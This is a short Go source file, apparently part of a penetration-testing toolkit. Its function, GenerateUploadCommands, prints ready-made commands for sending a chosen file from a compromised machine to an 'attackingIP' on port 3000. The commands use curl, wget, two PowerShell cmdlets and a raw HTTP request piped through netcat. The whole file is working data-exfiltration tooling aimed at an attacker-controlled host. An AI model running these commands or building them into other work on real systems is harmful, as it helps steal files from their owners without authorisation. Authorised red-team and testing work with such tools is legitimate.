package handlers

import "fmt"

func GenerateUploadCommands(attackingIP string, filePath string) {
	fmt.Println("\n> cURL (Multipart Upload)")
	fmt.Printf("curl -X POST http://%s:3000/up -F \"file=@%s\"\n\n", attackingIP, filePath)

	fmt.Println("> cURL (Raw Binary Upload)")
	fmt.Printf("curl -X POST --data-binary \"@%s\" http://%s:3000/up -H \"Filename: %s\"\n\n", filePath, attackingIP, filePath)

	fmt.Println("> wget")
	fmt.Printf("wget --method=POST --body-file=%s --header=\"Filename: %s\" --header=\"Content-Type: application/octet-stream\" \"http://%s:3000/up\"\n\n", filePath, filePath, attackingIP)

	fmt.Println("> Invoke-WebRequest (PowerShell)")
	fmt.Printf("Invoke-WebRequest -Uri \"http://%s:3000/up\" -Method Post -InFile \"%s\" -ContentType \"application/octet-stream\" -Headers @{\"Filename\"=\"%s\"}\n\n", attackingIP, filePath, filePath)

	fmt.Println("> Invoke-RestMethod (PowerShell)")
	fmt.Printf("Invoke-RestMethod -Uri \"http://%s:3000/up\" -Method Post -InFile \"%s\" -ContentType \"application/octet-stream\" -Headers @{\"Filename\"=\"%s\"}\n\n", attackingIP, filePath, filePath)

	fmt.Println("> netcat (nc)")
	fmt.Printf("(echo -en \"POST /up HTTP/1.1\\r\\nHost: %s:3000\\r\\nContent-Length: $(wc -c < %s)\\r\\nFilename: %s\\r\\nContent-Type: application/octet-stream\\r\\n\\r\\n\"; cat %s) | nc %s 3000\n", attackingIP, filePath, filePath, filePath, attackingIP)
}
